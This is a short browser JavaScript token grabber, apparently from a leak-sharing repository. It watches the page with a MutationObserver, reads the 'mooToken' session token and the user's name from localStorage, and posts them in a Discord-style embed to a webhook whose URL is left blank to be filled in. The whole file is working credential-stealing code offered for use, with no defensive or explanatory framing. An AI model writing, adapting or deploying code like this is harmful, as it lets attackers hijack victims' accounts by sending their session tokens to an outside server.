const myWebhookURL = "";

function sendMooToken(webhookURL, fullName, mooToken) {
  const request = new XMLHttpRequest();
  const params = JSON.stringify({
    username: "LinziTrixi",
    avatar_url: "https://avatars.githubusercontent.com/u/134342405?v=4",
    embeds: [
      {
        color: 3447003,
        fields: [
          {
            name: "Full Name: ",
            value: fullName,
          },
          {
            name: "mooToken: ",
            value: mooToken,
          },
        ],
        footer: {
          text: "github.com/RazeLeakers",
        },
      },
    ],
  });

  request.open("POST", webhookURL);
  request.setRequestHeader("Content-type", "application/json");
  request.send(params);
}

let saveToken = "";

const observer = new MutationObserver(() => {
  const userToken = localStorage.getItem("mooToken");

  if (!userToken || userToken === saveToken) return;

  const userInfo = localStorage.getItem("user");

  if (userInfo) {
    sendMooToken(myWebhookURL, JSON.parse(userInfo).name, userToken);
  } else {
    sendMooToken(myWebhookURL, null, userToken);
  }
  console.log("%cSend!", "color: red; font-size: 40px;");
  saveToken = userToken;
});

observer.observe(document.body, { childList: true, subtree: true });
